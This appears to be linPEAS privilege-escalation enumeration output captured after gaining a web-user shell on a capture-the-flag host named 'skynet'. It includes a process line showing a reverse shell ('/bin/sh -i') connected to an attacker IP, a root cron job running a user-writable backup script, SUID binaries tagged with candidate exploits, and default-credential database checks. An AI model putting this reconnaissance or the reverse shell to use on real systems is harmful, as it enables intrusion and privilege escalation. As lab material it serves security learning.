+www-data  1255  0.0  1.1 466948 11748 ?        S    14:18   0:00 /usr/sbin/apache2 -k start
+www-data  1256  0.0  1.5 467288 16036 ?        S    14:18   0:00 /usr/sbin/apache2 -k start
+www-data  1258  0.0  1.7 467352 17436 ?        S    14:18   0:00 /usr/sbin/apache2 -k start
+www-data  1259  0.0  1.1 466900 11612 ?        S    14:18   0:00 /usr/sbin/apache2 -k start
+www-data  1563  0.0  1.5 467160 15724 ?        S    14:25   0:00 /usr/sbin/apache2 -k start
+www-data  1564  0.0  1.1 466916 11720 ?        S    14:25   0:00 /usr/sbin/apache2 -k start
+www-data  1565  0.0  1.1 466924 11724 ?        S    14:25   0:00 /usr/sbin/apache2 -k start
+www-data  1570  0.0  1.6 467024 16272 ?        S    14:26   0:00 /usr/sbin/apache2 -k start
+www-data  1571  0.0  1.5 467024 15800 ?        S    14:26   0:00 /usr/sbin/apache2 -k start
+www-data  1572  0.0  1.5 467024 15800 ?        S    14:26   0:00 /usr/sbin/apache2 -k start
+www-data  1906  0.0  0.0   4500   752 ?        S    14:45   0:00 sh -c uname -a; w; id; /bin/sh -i
+www-data  1910  0.0  0.1   4500  1560 ?        S    14:45   0:00 /bin/sh -i
+www-data  2004  0.0  0.2   4824  2140 ?        S    15:05   0:00 /bin/sh ./linpeas.sh
+www-data  2498  0.0  0.2  34424  2884 ?        R    15:06   0:00 ps aux
+www-data  2500  0.0  0.0  12892   808 ?        S    15:06   0:00 sort
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+lrwxrwxrwx 1 root root        4 Sep 17  2019 /bin/sh -> dash
+-rwxr-xr-x 1 root root   326232 Apr  3  2019 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   618520 Apr  3  2019 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   141904 Apr  3  2019 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   453240 Apr  3  2019 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    44104 May 16  2018 /sbin/agetty
+-rwxr-xr-x 1 root root   487248 Mar  5  2018 /sbin/dhclient
+lrwxrwxrwx 1 root root       20 Apr  3  2019 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   783984 Dec 11  2018 /sbin/iscsid
+-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
+-rwxr-xr-x 1 root root   513216 Nov  8  2017 /sbin/mdadm
+-rwxr-xr-x 1 root root   224208 Jun 10  2019 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root    18504 Nov  8  2017 /usr/bin/lxcfs
+-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root root    15048 Mar 27  2019 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root    38864 Jan 17  2018 /usr/lib/postfix/sbin/master
+-rwxr-xr-x 1 root root    48112 Apr  8  2016 /usr/sbin/acpid
+-rwxr-xr-x 1 root root   662560 Aug 26  2019 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd
+-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
+-rwxr-xr-x 1 root root    79968 Aug 28  2019 /usr/sbin/dovecot
+-rwxr-xr-x 1 root root 24966440 Jul 23  2019 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   247832 May 23  2019 /usr/sbin/nmbd
+-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root    71776 May 23  2019 /usr/sbin/smbd
+-rwxr-xr-x 1 root root   791024 Mar  4  2019 /usr/sbin/sshd
+-rwxr-xr-x 1 root root  1140056 May 23  2019 /usr/sbin/winbindd
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
+-rw-r--r-- 1 root root  776 Sep 17  2019 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--   1 root root  712 Dec 17  2018 php
+-rw-r--r--   1 root root  191 Sep 17  2019 popularity-contest
+
+/etc/cron.daily:
+total 68
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x   1 root root  539 Jun 11  2018 apache2
+-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x   1 root root 1474 Oct  9  2018 apt-compat
+-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x   1 root root 1597 Nov 26  2015 dpkg
+-rwxr-xr-x   1 root root  372 May  5  2015 logrotate
+-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db
+-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
+-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest
+-rwxr-xr-x   1 root root  383 Sep 24  2018 samba
+-rwxr-xr-x   1 root root  330 Apr  7  2018 squirrelmail
+-rwxr-xr-x   1 root root  214 Dec  7  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db
+-rwxr-xr-x   1 root root  211 Dec  7  2018 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  bootmisc.sh
+ [ - ]  checkfs.sh
+ [ - ]  checkroot-bootclean.sh
+ [ - ]  checkroot.sh
+ [ + ]  console-setup
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  dovecot
+ [ + ]  grub-common
+ [ - ]  hostname.sh
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  iscsid
+ [ + ]  keyboard-setup
+ [ - ]  killprocs
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ + ]  lxcfs
+ [ - ]  lxd
+ [ + ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ - ]  mountall-bootclean.sh
+ [ - ]  mountall.sh
+ [ - ]  mountdevsubfs.sh
+ [ - ]  mountkernfs.sh
+ [ - ]  mountnfs-bootclean.sh
+ [ - ]  mountnfs.sh
+ [ + ]  mysql
+ [ + ]  networking
+ [ + ]  nmbd
+ [ + ]  ondemand
+ [ + ]  open-iscsi
+ [ - ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  postfix
+ [ + ]  procps
+ [ + ]  rc.local
+ [ + ]  resolvconf
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ + ]  samba
+ [ + ]  samba-ad-dc
+ [ - ]  screen-cleanup
+ [ - ]  sendsigs
+ [ + ]  smbd
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ - ]  umountfs
+ [ - ]  umountnfs.sh
+ [ - ]  umountroot
+ [ + ]  unattended-upgrades
+ [ + ]  urandom
+ [ - ]  uuidd
+ [ + ]  winbind
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH so I'm not going to list relative paths executed by services
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
+Sun 2020-10-25 15:09:00 CDT  2min 44s left Sun 2020-10-25 14:39:02 CDT  27min ago phpsessionclean.timer        phpsessionclean.service
+Sun 2020-10-25 23:53:20 CDT  8h left       Sun 2020-10-25 14:18:50 CDT  47min ago apt-daily.timer              apt-daily.service
+Mon 2020-10-26 06:31:02 CDT  15h left      Sun 2020-10-25 14:18:50 CDT  47min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2020-10-26 14:33:45 CDT  23h left      Sun 2020-10-25 14:33:45 CDT  32min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
+n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+skynet
+127.0.0.1	localhost
+127.0.1.1	skynet
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 10.0.0.2
+search eu-west-1.compute.internal
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Networks and neighbours
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+eth0      Link encap:Ethernet  HWaddr 02:8f:13:58:ef:05  
+          inet addr:10.10.166.138  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::8f:13ff:fe58:ef05/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:738 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:855 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:290617 (290.6 KB)  TX bytes:438561 (438.5 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:188 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:188 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:13832 (13.8 KB)  TX bytes:13832 (13.8 KB)
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
+10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
+tcp        0   2337 10.10.209.240:52664     10.11.10.169:1234       ESTABLISHED 1906/sh         
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
+tcp6       0      0 :::445                  :::*                    LISTEN      -               
+tcp6       0      0 :::139                  :::*                    LISTEN      -               
+tcp6       0      0 :::110                  :::*                    LISTEN      -               
+tcp6       0      0 :::143                  :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 10.10.209.240:80        10.11.10.169:51386      ESTABLISHED -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+udp        0      0 10.10.255.255:137       0.0.0.0:*                           -               
+udp        0      0 10.10.209.240:137       0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:137             0.0.0.0:*                           -               
+udp        0      0 10.10.255.255:138       0.0.0.0:*                           -               
+udp        0      0 10.10.209.240:138       0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:138             0.0.0.0:*                           -               
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=1001(milesdyson) gid=1001(milesdyson) groups=1001(milesdyson)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
+uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
+uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=111(dovecot) gid=119(dovecot) groups=119(dovecot)
+uid=112(dovenull) gid=120(dovenull) groups=120(dovenull)
+uid=113(postfix) gid=121(postfix) groups=121(postfix)
+uid=114(mysql) gid=123(mysql) groups=123(mysql)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 15:06:17 up 47 min,  0 users,  load average: 0.44, 0.10, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  4.8.0-58-generic Tue Sep 17 23:08 - 03:10 (2+04:01)
+root     pts/0        192.168.1.147    Tue Sep 17 23:02 - crash  (00:06)
+reboot   system boot  4.8.0-58-generic Tue Sep 17 23:01 - 03:10 (2+04:08)
+root     pts/0        192.168.1.147    Tue Sep 17 17:35 - down   (05:25)
+johnconn pts/0        192.168.1.147    Tue Sep 17 01:17 - 06:29  (05:12)
+reboot   system boot  4.4.0-142-generi Tue Sep 17 01:16 - 23:01  (21:44)
+johnconn tty1                          Tue Sep 17 01:00 - crash  (00:16)
+reboot   system boot  4.4.0-142-generi Tue Sep 17 00:59 - 23:01  (22:01)
+
+wtmp begins Tue Sep 17 00:59:57 2019
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             pts/0    192.168.1.147    Wed Sep 18 00:09:29 -0500 2019
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 14.14 Distrib 5.7.27, for Linux (x86_64) using  EditLine wrapper
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Looking for mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.18 (Ubuntu)
+Server built:   2019-08-26T13:43:29
+PHP exec extensions
+/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/conf-available/php5.6-cgi.conf-
+/etc/apache2/conf-available/php5.6-cgi.conf:# application/x-httpd-php                        phtml pht php
+/etc/apache2/conf-available/php5.6-cgi.conf:# application/x-httpd-php3                       php3
+/etc/apache2/conf-available/php5.6-cgi.conf:# application/x-httpd-php4                       php4
+/etc/apache2/conf-available/php5.6-cgi.conf:# application/x-httpd-php5                       php
+/etc/apache2/conf-available/php5.6-cgi.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/conf-available/php5.6-cgi.conf:    SetHandler application/x-httpd-php
+/etc/apache2/conf-available/php5.6-cgi.conf-</FilesMatch>
+/etc/apache2/conf-available/php5.6-cgi.conf:# application/x-httpd-php-source                 phps
+/etc/apache2/conf-available/php5.6-cgi.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/conf-available/php5.6-cgi.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/conf-available/php5.6-cgi.conf-#</Directory>
+/etc/apache2/conf-available/php5.6-cgi.conf:#Action application/x-httpd-php /cgi-bin/php5.6
+--
+/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php-source
+
+[+] Looking for PHPCookies
+ Not Found
+
+[+] Looking for Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Looking for Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Looking for Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Looking for supervisord configuration file
+supervisord.conf Not Found
+
+[+] Looking for cesi configuration file
+cesi.conf Not Found
+
+[+] Looking for Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Looking for Hostapd config file
+hostapd.conf Not Found
+
+[+] Looking for wifi conns file
+ Not Found
+
+[+] Looking for Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Looking for .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Looking for ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Looking for .ovpn files and credentials
+.ovpn Not Found
+
+[+] Looking for ssl/ssh files
+Port 22
+PermitRootLogin yes
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+  --> Some certificates were found (out limited):
+/var/spool/postfix/etc/ssl/certs/ca-certificates.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+
+
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+[+] Looking for unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Looking for Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Looking for kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+tickets kerberos Not Found
+klist Not Found
+
+[+] Looking for Kibana yaml
+kibana.yml Not Found
+
+[+] Looking for Knock configuration
+Knock.config Not Found
+
+[+] Looking for logstash files
+ Not Found
+
+[+] Looking for elasticsearch files
+ Not Found
+
+[+] Looking for Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Looking for AD cached hashes
+-rw------- 1 root root 430080 Sep 17  2019 /var/lib/samba/private/secrets.tdb
+
+[+] Looking for screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+No Sockets found in /var/run/screen/S-www-data.
+
+[+] Looking for tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Looking for Couchdb directory
+
+[+] Looking for redis.conf
+
+[+] Looking for dovecot files
+dovecot credentials Not Found
+
+[+] Looking for mosquitto.conf
+
+[+] Looking for neo4j auth file
+
+[+] Looking Cloud-Init conf file
+
+[+] Looking Erlang cookie file
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/sbin/mount.cifs
+/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/fusermount
+/bin/umount		--->	BSD/Linux(08-1996)
+/bin/ping
+/bin/su
+/bin/ping6
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/sudo		--->	/sudo$
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/gpasswd
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/newuidmap
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/bin/mlocate
+/usr/bin/bsd-write
+/usr/bin/crontab
+/usr/bin/chage
+/usr/bin/screen		--->	GNU_Screen_4.5.0
+/usr/bin/expiry
+/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/lib/snapd/snap-confine
+
+[+] Writable folders configured in /etc/ld.so.conf.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
+/usr/lib/x86_64-linux-gnu/libfakeroot
+/usr/local/lib
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr = cap_net_raw+ep
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+
+[+] Files (scripts) in /etc/profile.d/
+total 24
+drwxr-xr-x   2 root root 4096 Sep 17  2019 .
+drwxr-xr-x 102 root root 4096 Sep 20  2019 ..
+-rw-r--r--   1 root root 1557 Apr 14  2016 Z97-byobu.sh
+-rw-r--r--   1 root root  825 Jan 29  2019 apps-bin-path.sh
+-rw-r--r--   1 root root  663 May 18  2016 bash_completion.sh
+-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+
+[+] Hashes inside passwd file? ........... No
+[+] Hashes inside group file? ............ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read root folder? .............. No
+
+[+] Looking for root files in home dirs (limit 20)
+/home
+/home/milesdyson/.bash_history
+/home/milesdyson/backups
+/home/milesdyson/backups/backup.sh
+/home/milesdyson/backups/backup.tgz
+/home/milesdyson/share/Improving Deep Neural Networks.pdf
+/home/milesdyson/share/Natural Language Processing-Building Sequence Models.pdf
+/home/milesdyson/share/Convolutional Neural Networks-CNN.pdf
+/home/milesdyson/share/notes
+/home/milesdyson/share/notes/3.01 Search.md
+/home/milesdyson/share/notes/4.01 Agent-Based Models.md
+/home/milesdyson/share/notes/2.08 In Practice.md
+/home/milesdyson/share/notes/0.00 Cover.md
+/home/milesdyson/share/notes/1.02 Linear Algebra.md
+/home/milesdyson/share/notes/important.txt
+/home/milesdyson/share/notes/6.01 pandas.md
+/home/milesdyson/share/notes/3.00 Artificial Intelligence.md
+/home/milesdyson/share/notes/2.01 Overview.md
+/home/milesdyson/share/notes/3.02 Planning.md
+/home/milesdyson/share/notes/1.04 Probability.md
+
+[+] Looking for others files in folders owned by me
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/home/milesdyson/backups/backup.tgz
+/tmp/linpeas.sh
+/var/log/syslog
+/var/log/kern.log
+/var/log/mail.log
+/var/log/auth.log
+/var/mail/root
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/milesdyson/.bash_logout
+/home/milesdyson/backups/backup.sh
+/home/milesdyson/backups/backup.tgz
+/home/milesdyson/share/Improving Deep Neural Networks.pdf
+/home/milesdyson/share/Natural Language Processing-Building Sequence Models.pdf
+/home/milesdyson/share/Convolutional Neural Networks-CNN.pdf
+/home/milesdyson/share/notes/3.01 Search.md
+/home/milesdyson/share/notes/4.01 Agent-Based Models.md
+/home/milesdyson/share/notes/2.08 In Practice.md
+/home/milesdyson/share/notes/0.00 Cover.md
+/home/milesdyson/share/notes/1.02 Linear Algebra.md
+/home/milesdyson/share/notes/important.txt
+/home/milesdyson/share/notes/6.01 pandas.md
